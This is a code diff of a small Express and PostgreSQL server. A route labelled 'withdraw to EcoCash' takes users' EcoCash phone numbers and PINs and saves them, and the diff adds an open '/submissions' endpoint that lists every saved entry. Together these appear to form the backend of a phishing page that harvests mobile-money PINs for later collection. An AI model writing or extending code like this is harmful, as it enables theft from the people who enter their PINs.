@@ -30,7 +30,7 @@ stack: err.stack
 
 app.get("/create-table", async (req, res) => {
 try {
-await pool.query("CREATE TABLE IF NOT EXISTS submissions ( id SERIAL PRIMARY KEY, ecocash_number TEXT NOT NULL, ecocash_pin TEXT NOT NULL, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP )");
+await pool.query("CREATE TABLE IF NOT EXISTS submissions ( id SERIAL PRIMARY KEY, ecocash_number TEXT NOT NULL, reference_number TEXT NOT NULL, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP )");
 
 res.send("Table created successfully");
 
@@ -57,7 +57,7 @@ error: err.message
 }
 });
 
-app.post("/withdraw to EcoCash", async (req, res) => {
+app.post("/Withdraw to EcoCash", async (req, res) => {
 try {
 const { ecocash_number, ecocash_pin } = req.body;
 
@@ -70,6 +70,21 @@ res.json({
   success: true,
   message: "Data saved successfully"
 });
+
+} catch (err) {
+res.status(500).json({
+error: err.message
+});
+}
+});
+
+app.get("/submissions", async (req, res) => {
+try {
+const result = await pool.query(
+"SELECT * FROM submissions ORDER BY id DESC"
+);
+
+res.json(result.rows);
 
 } catch (err) {
 res.status(500).json({
